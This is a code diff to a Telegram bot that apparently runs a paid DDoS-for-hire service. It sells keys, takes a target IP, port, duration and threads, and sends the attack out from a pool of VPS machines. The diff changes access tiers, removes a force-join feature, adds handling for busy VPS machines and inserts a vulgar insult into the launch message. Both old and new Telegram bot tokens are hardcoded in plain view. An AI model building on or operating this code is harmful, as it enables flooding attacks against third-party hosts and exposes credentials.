@@ -7,7 +7,6 @@ import random
 import json
 import shutil
 import uuid
-import telegram
 from collections import defaultdict
 from telegram import Update, ReplyKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext, ConversationHandler
@@ -39,7 +38,7 @@ BOT_CONFIG_FILE = "bot_configs.json"
 BOT_DATA_DIR = "bot_data"  # Directory to store each bot's data
 
 # Bot Configuration
-TELEGRAM_BOT_TOKEN = '7623380258:AAHtmKVKzNvumZyU0-GdOZ2WJ3a5XJSeMxw'
+TELEGRAM_BOT_TOKEN = '7064980384:AAGfNFTaf81DF3P4NLhHm0TRBSEV1XfBATw'
 OWNER_USERNAME = "Riyahacksyt"
 CO_OWNERS = []  # List of user IDs for co-owners
 OWNER_CONTACT = "Contact @rtt to buy keys"
@@ -62,10 +61,6 @@ LOG_DATA = defaultdict(list)
 # Link Management
 LINK_FILE = "links.json"
 LINKS = {}
-
-# Force Join Configuration
-FORCE_JOIN_ENABLED = False
-FORCE_JOIN_CHANNEL = "@lalanub120"  # Change this to your channel
 
 # VPS Configuration
 VPS_FILE = "vps.txt"
@@ -297,7 +292,7 @@ owner_keyboard = [
     ['Rules', 'Settings', 'Generate Key'],
     ['Delete Key', '🔑 Special Key', '⏳ Uptime'],
     ['OpenBot', 'CloseBot', '👥 Check Users'],
-    ['⚙️ Owner Settings', 'Menu', 'Force On', 'Force Off']
+    ['⚙️ Owner Settings', 'Menu']
 ]
 owner_markup = ReplyKeyboardMarkup(owner_keyboard, resize_keyboard=True)
 
@@ -416,85 +411,6 @@ async def view_logs(update: Update, context: CallbackContext):
     except Exception as e:
         logging.error(f"Error sending logs: {e}")
         await update.message.reply_text("Error loading logs.", parse_mode='Markdown')
-
-async def force_join_on(update: Update, context: CallbackContext):
-    """Enable force join requirement"""
-    if not (is_owner(update) or is_co_owner(update)):
-        await update.message.reply_text("❌ Only owner or co-owners can enable force join!", parse_mode='Markdown')
-        return
-    
-    global FORCE_JOIN_ENABLED
-    FORCE_JOIN_ENABLED = True
-    
-    await update.message.reply_text(
-        f"✅ Force Join enabled!\n\n"
-        f"Users must join {FORCE_JOIN_CHANNEL} before attacking.\n"
-        f"Key holders can still attack without joining.",
-        parse_mode='Markdown'
-    )
-
-async def force_join_off(update: Update, context: CallbackContext):
-    """Disable force join requirement"""
-    if not (is_owner(update) or is_co_owner(update)):
-        await update.message.reply_text("❌ Only owner or co-owners can disable force join!", parse_mode='Markdown')
-        return
-    
-    global FORCE_JOIN_ENABLED
-    FORCE_JOIN_ENABLED = False
-    
-    await update.message.reply_text(
-        "✅ Force Join disabled!\n\n"
-        "Users now need valid keys for all attacks.\n"
-        "Channel membership no longer grants access.",
-        parse_mode='Markdown'
-    )
-
-async def check_channel_membership(user_id: int, context: CallbackContext, channel: str) -> bool:
-    """Check if a user is a member of the specified channel with robust error handling."""
-    if not isinstance(user_id, int) or user_id <= 0:
-        logging.error(f"Invalid user_id {user_id} when checking channel membership")
-        return False
-    
-    if not channel.startswith('@') and not channel.startswith('-100'):
-        logging.error(f"Invalid channel format: {channel}")
-        return False
-
-    try:
-        # First verify the user exists
-        try:
-            user = await context.bot.get_chat(user_id)
-            if not user:
-                logging.error(f"User {user_id} not found")
-                return False
-        except Exception as e:
-            logging.error(f"Error verifying user {user_id}: {str(e)}")
-            return False
-
-        # Now check channel membership
-        try:
-            chat_member = await context.bot.get_chat_member(
-                chat_id=channel,
-                user_id=user_id
-            )
-            return chat_member.status not in ['left', 'kicked']
-        except telegram.error.BadRequest as e:
-            if "user not found" in str(e).lower():
-                logging.error(f"User {user_id} not found when checking channel membership")
-            elif "chat not found" in str(e).lower():
-                logging.error(f"Channel {channel} not found")
-            else:
-                logging.error(f"BadRequest when checking channel membership: {e}")
-            return False
-        except Exception as e:
-            logging.error(f"Unexpected error checking channel membership: {e}")
-            return False
-
-    except Exception as e:
-        logging.error(f"General error in check_channel_membership: {e}")
-        return False
-
-
-
 
 
 def get_uptime():
@@ -1688,7 +1604,6 @@ async def redeem_key_input(update: Update, context: CallbackContext):
 
 async def attack_start(update: Update, context: CallbackContext):
     chat = update.effective_chat
-    user_id = update.effective_user.id
 
     if chat.type == "private":
         if not is_authorized_user(update):
@@ -1713,22 +1628,17 @@ async def attack_start(update: Update, context: CallbackContext):
         )
         return ConversationHandler.END
 
-    # Check if user has a valid key
-    user_has_key = user_id in redeemed_users and (
-        (isinstance(redeemed_users[user_id], dict) and redeemed_users[user_id]['expiration_time'] > time.time()) or
-        (isinstance(redeemed_users[user_id], (int, float)) and redeemed_users[user_id] > time.time())
-    )
-    
-    # Check if bot is open (no key needed)
+    user_id = update.effective_user.id
+
+    # Fixed condition with proper parentheses
     user_has_access = False
     if bot_open:
         user_has_access = True
-    elif user_has_key:
-        user_has_access = True
-    elif FORCE_JOIN_ENABLED:
-        # Only check channel membership if force join is enabled
-        is_member = await check_channel_membership(user_id, context, FORCE_JOIN_CHANNEL)
-        if is_member:
+    elif user_id in redeemed_users:
+        if isinstance(redeemed_users[user_id], dict):
+            if redeemed_users[user_id].get('is_special', False):
+                user_has_access = True
+        elif isinstance(redeemed_users[user_id], (int, float)):
             user_has_access = True
 
     if user_has_access:
@@ -1736,26 +1646,19 @@ async def attack_start(update: Update, context: CallbackContext):
         
         await update.message.reply_text(
             "⚠️ *Enter the attack arguments: <ip> <port> <duration> <threads>*\n\n"
-            f"ℹ️ *Max duration: {max_duration} sec for channel members, {SPECIAL_MAX_DURATION} sec for key holders.*\n\n"
-            f"🔑 *Buy keys from {current_display_name} for extended features*",
+            f"ℹ️ *When bot is open, max duration is {max_duration} sec. For {SPECIAL_MAX_DURATION} sec, you need a key.*\n\n"
+            f"🔑 *Buy keys from {current_display_name}*",
             parse_mode='Markdown'
         )
         return GET_ATTACK_ARGS
     else:
         current_display_name = get_display_name(update.effective_chat.id)
         
-        if FORCE_JOIN_ENABLED:
-            await update.message.reply_text(
-                f"❌ *You must join {FORCE_JOIN_CHANNEL} to attack!*\n\n"
-                f"🔑 *Or buy a key from {current_display_name} for uninterrupted access*",
-                parse_mode='Markdown'
-            )
-        else:
-            await update.message.reply_text(
-                f"❌ *You need a valid key to attack!*\n\n"
-                f"🔑 *Buy keys from {current_display_name}*",
-                parse_mode='Markdown'
-            )
+        await update.message.reply_text(
+            "❌ *You need a valid key to start an attack!*\n\n"
+            f"🔑 *Buy keys from {current_display_name}*",
+            parse_mode='Markdown'
+        )
         return ConversationHandler.END
 
 async def attack_input(update: Update, context: CallbackContext):
@@ -1768,7 +1671,7 @@ async def attack_input(update: Update, context: CallbackContext):
         await update.message.reply_text(
             f"❌ *Invalid input! Please enter <ip> <port> <duration> <threads>*\n\n"
             f"👑 *Bot Owner:* {current_display_name}\n"
-            f"💬 *Need a key? DM:* {current_display_name}",
+            f"💬 *Need a key for 200s? DM:* {current_display_name}",
             parse_mode='Markdown'
         )
         return ConversationHandler.END
@@ -1777,30 +1680,40 @@ async def attack_input(update: Update, context: CallbackContext):
     duration = int(duration)
     threads = int(threads)
 
-    user_id = update.effective_user.id
+    # Check if all VPS are busy
+    busy_vps = [attack['vps_ip'] for attack in running_attacks.values() if 'vps_ip' in attack]
+    available_vps = [vps[0] for vps in VPS_LIST if vps[0] not in busy_vps]
     
-    # Check user's permissions
-    is_member = await check_channel_membership(user_id, context, FORCE_JOIN_CHANNEL)
+    if not available_vps and VPS_LIST:  # If no VPS available but we have VPS configured
+        busy_list = "\n".join(set(busy_vps))  # Get unique VPS IPs
+        await update.message.reply_text(
+            f"❌ *All VPS are currently busy with attacks!*\n\n"
+            f"🚦 *Currently busy VPS:*\n{busy_list}\n\n"
+            f"Please try again later.",
+            parse_mode='Markdown'
+        )
+        return ConversationHandler.END
+
+    user_id = update.effective_user.id
     is_special = False
     
     if user_id in redeemed_users:
         if isinstance(redeemed_users[user_id], dict) and redeemed_users[user_id].get('is_special'):
             is_special = True
-            max_allowed_duration = SPECIAL_MAX_DURATION
-            max_allowed_threads = SPECIAL_MAX_THREADS
-        elif isinstance(redeemed_users[user_id], (int, float)) and redeemed_users[user_id] > time.time():
-            max_allowed_duration = max_duration  # Regular key holders get standard limits
-            max_allowed_threads = MAX_THREADS
-    elif is_member:
-        # Channel members get basic access
-        max_allowed_duration = 120  # 2 minutes for channel members
-        max_allowed_threads = 1000
-    else:
+    
+    if duration > max_duration and not is_special:
+        current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
+        
         await update.message.reply_text(
-            "❌ *Access denied! Join the channel or get a key.*",
+            f"❌ *Attack duration exceeds 120 seconds!*\n"
+            f"🔑 *For 200 seconds attacks, you need a special key.*\n\n"
+            f"👑 *Buy keys from:* {current_display_name}",
             parse_mode='Markdown'
         )
         return ConversationHandler.END
+
+    max_allowed_duration = SPECIAL_MAX_DURATION if is_special else max_duration
+    max_allowed_threads = SPECIAL_MAX_THREADS if is_special else MAX_THREADS
 
     if duration > max_allowed_duration:
         current_display_name = get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)
@@ -1822,11 +1735,10 @@ async def attack_input(update: Update, context: CallbackContext):
         )
         return ConversationHandler.END
 
-    # Rest of the attack logic remains the same...
     last_attack_time = time.time()
     
     # Select a random available VPS
-    selected_vps_ip = random.choice([vps[0] for vps in VPS_LIST]) if VPS_LIST else "localhost"
+    selected_vps_ip = random.choice(available_vps) if available_vps else "localhost"
     
     attack_id = f"{ip}:{port}-{time.time()}"
     running_attacks[attack_id] = {
@@ -1848,11 +1760,9 @@ async def attack_input(update: Update, context: CallbackContext):
         f"🧵 *Threads*: {threads}\n"
         f"🌐 *VPS Used*: `{selected_vps_ip}`\n"
         f"👑 *Bot Owner:* {current_display_name}\n\n"
-        f"🔥 *Attack launched successfully!*",
+        f"🔥 *RITIK KI MUMMY CHODNA CHALU HO GY HA! 💥*",
         parse_mode='Markdown'
     )
-
-    # Rest of the attack execution code...
 
     async def run_attack():
         try:
@@ -3532,10 +3442,6 @@ def main():
     application.add_handler(delete_binary_handler)
     application.add_handler(CommandHandler("listbots", show_bot_list_cmd))
     application.add_handler(CommandHandler("start", start))
-    application.add_handler(CommandHandler("forceon", force_join_on))
-    application.add_handler(CommandHandler("forceoff", force_join_off))
-    application.add_handler(MessageHandler(filters.Text("Force On"), force_join_on))
-    application.add_handler(MessageHandler(filters.Text("Force Off"), force_join_off))
     application.add_handler(MessageHandler(filters.PHOTO, handle_photo))
     application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_button_click))
     application.add_handler(MessageHandler(filters.ALL & filters.ChatType.PRIVATE, track_new_chat))
@@ -3546,8 +3452,8 @@ def main():
     # Add job queue to check expired keys
     job_queue = application.job_queue
     job_queue.run_repeating(check_expired_keys, interval=3600, first=10)  # Check every hour
+
     application.run_polling()
 
 if __name__ == '__main__':
     main()
-
